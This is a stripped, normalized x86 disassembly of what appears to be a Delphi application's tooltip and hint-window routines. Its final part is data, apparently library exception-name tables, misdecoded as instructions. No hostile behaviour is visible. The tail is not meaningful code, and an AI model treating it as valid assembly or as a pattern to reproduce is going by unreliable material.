push ebp
xor eax eax
call sub_46edfc
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46c048
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_46edfc
pop ecx
jmp r-xdata
mov eax ebx
call sub_4553b8
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_4550b4
push eax
call IsChild
test eax eax
jne r-xdata
sub_46eee0
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405ab8
call sub_42ba34
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_46ef08
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_46ef4c
push sub_46cc38
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_46f100
sub_46ef74
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406e50
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_44e3cc
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_44d160
call sub_46cc18
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_46f100
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406e50
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_44e3cc
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_46f100
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_46ef08
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_44fa80
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_46f398
jmp r-xdata
sub_46f084
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_46ef4c
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_46f398
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_46f0bc
jmp r-xdata
sub_46f0bc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4553b8
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4550b4
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_4550b4
push eax
call ShowWindow
sub_46f100
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_46f0bc
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_46cda0
mov eax ebx
call sub_46ef4c
sub_46f138
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_46f27a
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_426d48
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407fe0
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_46f24b
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_426e00
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f252
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_40270c
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_46f128
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_46f128
mov [ ebp - 0x4 ] eax
sub_46f252
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_46f28c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_40331c
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_403264
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_46f2ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_46f386
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f38d
lea eax [ ebp - 0x8 ]
call sub_404118
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404208
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_42592c
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c970
mov ebx eax
inc ebx
sub_46f398
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404aa4
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_46f71e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_46f100
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_46ef08
jmp r-xdata
call sub_4655b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f725
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_40413c
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404b68
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_44d160
call sub_46cc18
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_46f138
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_46bfdc
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44e254
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44e3f8
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_46cbe0
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_44b9d4
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_4041b0
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_44fa80
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_46f28c
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403518
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44e3cc
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44e3cc
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_44ea54
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_46cd2c
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_46f2ec
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_46ef08
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_46ef08
jmp r-xdata
sub_46f72c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_40416c
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_40416c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46f768
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_44fa80
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_44fa80
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_45b2b8
sub_46f7f8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_46f820
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_46f8c4
add [ eax ] eax
add [ eax ] al
pushfd
dec esi
dec ecx
add [ edi + ebp * 4 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46f927
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f92e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_465360
mov eax sub_4655e0
call sub_4186a0
mov eax [ rw-data ]
push eax
call CloseHandle
sub_46f978
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar cl 0x46
add [ eax + eax ] cl
add [ eax ] al
in al dx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 8 ] bl
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax * 2 + 0x78456449 ] cl
arpl [ ebp + 0x70 ] sp
je r-xdata
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] dl
inc ebp
dec ecx
push ebx
imul ebp [ ebp + 0x6e ] 0x63784574
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
lea eax [ eax ]
sbb al 0xfa
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] 0x46fa7c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 8 + 0x46 ] bh
add [ eax ] al
add [ eax ] al
jl r-xdata
add [ eax + eax ] cl
add [ eax ] al
sar cl 0x1
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc esi
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc esi
outsb
arpl [ gs : ebp + 0x64 ] si
inc eax
sti
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5 ] al
inc edi
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ebx ] dl
inc ebp
dec ecx
inc ecx
insb
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
arpl [ ebp + 0x66 ] sp
jne r-xdata
imul esp [ ebp + 0x74 ] 0xffffff9c
popad
jns r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
sti
inc esi
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
sti
insb
jns r-xdata
add [ eax ] al
je r-xdata
add [ eax + eax ] cl
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ esi ] cl
inc ebp
dec ecx
push edx
popad
push esp
imul ebp [ ebp + 0x65 ] 0x9074756f
clc
sti
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edi ] cl
inc ebp
dec ecx
inc ebx
insb
outsd
jae r-xdata
outsd
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ esi ] bl
inc ebp
dec ecx
push edx
popad
dec esp
outsb
dec ebp
popad
js r-xdata
outsb
sti
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 8 + 0xc0046 ] bl
inc eax
add [ edi ] dl
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
inc ebx
insb
outsd
jae r-xdata
xor al [ eax ]
or al 0x33
cli
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
cli
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ 0x49644945 ] dl
outsb
jbe r-xdata
imul ebp [ esi + 0x65 ] 0x676e654c
je r-xdata
inc ebp
dec ecx
push eax
jb r-xdata
insb
imul esp [ ebx + edx * 2 + 0x65 ] 0x63697672
popad
insd
mov eax eax
inc ebp
js r-xdata
mov eax eax
je r-xdata
dec esi
nop
cld
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 8 + 0x46 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 8 + 0x46 ] cl
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ 0x53644945 ] dl
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
outsd
outsb
nop
std
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046fd ] dl
add [ eax ] al
add [ ecx + edi * 8 + 0x46 ] dh
arpl [ edi + 0x6c ] bp
push edx
jo r-xdata
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
inc [ esi ]
or al 0x0
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
inc [ esi ]
or al 0x0
jae r-xdata
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb bh bh
inc esi
add [ eax + eax ] cl
inc esi
popad
imul ebp [ ebp + 0x64 ] 0xfeb0c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046fe ] dh
add [ eax ] al
add [ ebp + edi * 8 + 0x354c0046 ] ah
inc eax
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ebx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ebx ] dl
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + eax * 2 + 0x78 ] si
